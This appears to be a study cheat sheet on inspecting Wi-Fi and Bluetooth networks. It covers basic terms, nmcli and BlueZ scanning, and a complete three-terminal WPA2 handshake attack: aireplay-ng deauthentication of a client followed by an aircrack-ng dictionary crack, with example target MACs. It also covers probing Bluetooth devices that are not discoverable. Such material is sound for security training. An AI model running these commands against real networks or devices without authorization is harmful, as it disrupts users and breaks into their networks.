# Understanding and Inspecting Wireless Networks

## Table of Contents

* [Introduction](#introduction)
* [Wi-Fi Fundamentals & Terminology](#wi-fi-fundamentals--terminology)
* [Basic Wireless Commands](#basic-wireless-commands)
* [Wi-Fi Reconnaissance & Cracking (Aircrack-ng)](#wi-fi-reconnaissance--cracking-aircrack-ng)
* [Bluetooth Concepts & Architecture](#bluetooth-concepts--architecture)
* [Bluetooth Scanning & Service Discovery (BlueZ)](#bluetooth-scanning--service-discovery-bluez)
* [Key Tips](#key-tips)
* [Quick Command Chains](#quick-command-chains)
* [Quick Start](#quick-start)

---

## Introduction

Wireless networks operating on IEEE 802.11 (Wi-Fi) and Bluetooth standards transmit data over open RF channels. Inspecting wireless environments involves discovering access points (APs), identifying client associations, switching interfaces to monitor mode, capturing handshake data, and enumerating Bluetooth services.

---

## Wi-Fi Fundamentals & Terminology

| Term / Parameter | Definition & Specification |
| --- | --- |
| **AP (Access Point)** | Device facilitating network access for wireless clients. |
| **SSID (Service Set Identifier)** | Public human-readable name of the wireless network. |
| **ESSID (Extended SSID)** | Network identifier applied across multiple APs in a single wireless LAN. |
| **BSSID (Basic SSID)** | Unique hardware identifier for an AP (matches device MAC address). |
| **Channels** | Operates on channels 1–14 globally; legally restricted to **channels 1–11 in the US**. |
| **Frequency** | Operates on **2.4 GHz** and **5 GHz** spectrum bands. |
| **Power & Range** | Legal US limit is **0.5 Watts** (~300 ft / 100 m range); high-gain antennas extend range up to 20 miles. |
| **Security Protocols** | **WEP** (Flawed/Cracked) $\rightarrow$ **WPA** (Legacy) $\rightarrow$ **WPA2-PSK** (Pre-Shared Key standard). |
| **Operational Modes** | **Managed** (Client Mode) | **Master** (Access Point Mode) | **Monitor** (Promiscuous RF Sniffing). |

---

## Basic Wireless Commands

### Interface Inspection and Scanning

```bash
# Display activated network interfaces (wireless designated as wlan0, wlan1, etc.)
ifconfig

# Display wireless-specific parameters (Mode, ESSID, Access Point MAC, Tx-Power, Frequency)
iwconfig

# Perform an active scan for nearby wireless access points
iwlist wlan0 scan

```

### NetworkManager CLI (`nmcli`) Controls

```bash
# List nearby wireless networks with SSID, Mode, Channel, Bitrate, Signal, and Security
nmcli dev wifi

# Authenticate and connect to a Wi-Fi Access Point
nmcli dev wifi connect <AP-SSID> password <APpassword>

```

---

## Wi-Fi Reconnaissance & Cracking (Aircrack-ng)

Cracking WPA2-PSK networks requires capturing the four-way handshake exchanged between a legitimate client and the target AP.

### Enabling Monitor Mode (`airmon-ng`)

```bash
# Terminate interfering background processes (if needed)
airmon-ng check kill

# Enable monitor mode on interface (renames interface to wlan0mon)
airmon-ng start wlan0

# Disable monitor mode
airmon-ng stop wlan0mon

```

### Capturing Wireless Traffic (`airodump-ng`)

```bash
# Monitor all nearby AP broadcasts and connected clients
airodump-ng wlan0mon

```

* **Captured AP Data:** BSSID, Signal Power (`PWR`), Beacon frames, Data throughput (`#Data`), Channel (`CH`), Encryption (`ENC`), Cipher (`CIPHER`), Authentication (`AUTH`), ESSID.
* **Captured Client Data:** Client BSSID, Station MAC, Signal Power, Rate, Lost packets, Frames, Probed SSIDs.

### WPA2 Handshake Attack (3-Terminal Sequence)

#### Terminal 1: Capture Target Channel & BSSID Traffic

```bash
airodump-ng -c <channel> --bssid <target_AP_MAC> -w <output_prefix> wlan0mon
# Example: airodump-ng -c 10 --bssid 01:01:AA:BB:CC:22 -w Hackers-ArisePSK wlan0mon

```

#### Terminal 2: Deauthenticate Client to Force Re-authentication

```bash
aireplay-ng --deauth <packet_count> -a <target_AP_MAC> -c <target_client_MAC> wlan0mon
# Example: aireplay-ng --deauth 100 -a 01:01:AA:BB:CC:22 -c A0:A3:E2:44:7C:E5 wlan0mon

```

> **Result:** Captures the WPA2 4-way password hash, displayed in the upper-right corner of Terminal 1.

#### Terminal 3: Dictionary Attack on Captured Handshake

```bash
aircrack-ng -w <wordlist> -b <target_AP_MAC> <capture_file.cap>
# Example: aircrack-ng -w wordlist.dic -b 01:01:AA:BB:CC:22 Hackers-ArisePSK.cap

```

---

## Bluetooth Concepts & Architecture

* **Protocol & Spectrum:** Operates on **2.4–2.485 GHz** using frequency hopping spread spectrum (**1,600 hops/sec**).
* **History:** Developed in 1994 by Ericsson Corp.; named after King Harald Bluetooth.
* **Range:** Minimum 10 meters; typical range up to 100 meters (extensible with specialized directional antennas).
* **Pairing & Discoverable Mode:** Transmits device **Name**, **Class**, **List of Services**, and **Technical Info**. Pairing exchanges a persistent **Link Key**.
* **Addressing:** Uses a unique **48-bit hardware identifier** (MAC-style address).

---

## Bluetooth Scanning & Service Discovery (BlueZ)

The **BlueZ** protocol stack provides CLI utilities for managing Bluetooth devices in Linux.

```bash
# Install BlueZ suite (if not pre-installed)
apt-get install bluez

```

### BlueZ Utility Breakdown

| Tool | Primary Operational Purpose |
| --- | --- |
| `hciconfig` | Configures local Bluetooth adapters (similar to `ifconfig`). |
| `hcitool` | Scans and inquires remote Bluetooth devices for identifiers and clocks. |
| `sdptool` | Queries Service Discovery Protocol (SDP) records on target devices. |
| `hcidump` | Sniffs and extracts data packets transmitted over Bluetooth connections. |
| `l2ping` | Sends L2CAP pings to target MAC addresses to verify reachability. |

### Command Execution Sequence

```bash
# Step 1: Verify local Bluetooth adapter state
hciconfig

# Step 2: Bring local HCI interface online
hciconfig hci0 up

# Step 3: Scan for discoverable Bluetooth devices (Returns MAC and Name)
hcitool scan

# Step 4: Perform low-level inquiry (Returns MAC, Clock Offset, Device Class)
hcitool inq

# Step 5: Enumerate SDP services (Works even if device is NOT in discovery mode)
sdptool browse <target_MAC>

# Step 6: Test connection reachability via L2CAP ping
l2ping <target_MAC> -c <packet_count>

```

---

## Key Tips

* **Promiscuous Sniffing** — A wireless card must be in **Monitor Mode** (`airmon-ng`) to capture raw 802.11 frames not addressed to your specific MAC address.
* **SDP Discovery Bypass** — Target Bluetooth devices do **not** need to be in discoverable mode for `sdptool browse` or `l2ping` to probe them if their MAC address is known.
* **Target Parameters Required for Cracking** — Successful WPA2 cracking requires three primary variables: Target BSSID (AP MAC), Client Station MAC, and Channel Number.

---

## Quick Command Chains

```bash
# Full Wi-Fi Monitor Activation Sequence
airmon-ng check kill && airmon-ng start wlan0

# Bluetooth Reconnaissance Chain
hciconfig hci0 up && hcitool scan && hcitool inq

# Target Bluetooth Service Audit & Ping Test
sdptool browse 76:6E:46:63:72:66 && l2ping 76:6E:46:63:72:66 -c 3

```

---

## Quick Start

Check Interface (`iwconfig` / `hciconfig`) $\rightarrow$ Enable Monitor/HCI (`airmon-ng start` / `hciconfig hci0 up`) $\rightarrow$ Perform Recon (`airodump-ng` / `hcitool scan`) $\rightarrow$ Capture Handshake / Enumerate SDP (`aireplay-ng` / `sdptool browse`) $\rightarrow$ Execute Exploit (`aircrack-ng`)
